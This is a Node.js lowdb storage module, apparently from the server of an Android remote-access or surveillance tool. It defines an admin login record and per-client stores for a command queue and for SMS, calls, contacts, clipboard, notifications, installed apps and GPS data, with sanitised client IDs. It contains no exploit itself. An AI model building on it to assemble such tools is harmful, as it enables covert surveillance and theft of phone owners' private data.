const
    lowdb = require('lowdb'),
    FileSync = require('lowdb/adapters/FileSync'),
    path = require('path'),
    crypto = require('crypto'),
    adapter = new FileSync('./maindb.json'),
    db = lowdb(adapter);

db.defaults({
    admin: {
        username: 'admin',
        password: '',
        loginToken: '',
        logs: [],
        ipLog: []
    },
    clients: []
}).write()

class clientdb {
    constructor(clientID) {
        // Sanitize clientID to prevent path traversal
        let safeClientID = (clientID || 'unknown').toString().replace(/[^a-zA-Z0-9_-]/g, '');
        // Patch: Limit clientID length to prevent filesystem errors
        if (safeClientID.length > 200) {
            safeClientID = safeClientID.substring(0, 200);
        }
        if (safeClientID === '') {
            safeClientID = 'unnamed_' + crypto.createHash('md5').update(String(clientID)).digest('hex').slice(0, 8);
        }
        let cdb = lowdb(new FileSync('./clientData/' + safeClientID + '.json'))
        cdb.defaults({
            clientID,
            CommandQue: [],
            SMSData: [],
            CallData: [],
            contacts: [],
            wifiNow: [],
            wifiLog: [],
            clipboardLog: [],
            notificationLog: [],
            enabledPermissions: [],
            apps: [],
            GPSData: [],
            GPSSettings: {
                updateFrequency: 0
            },
            downloads: [],
            currentFolder: []
        }).write()
        return cdb;
    }
}

module.exports = {
    maindb: db,
    clientdb: clientdb,
};

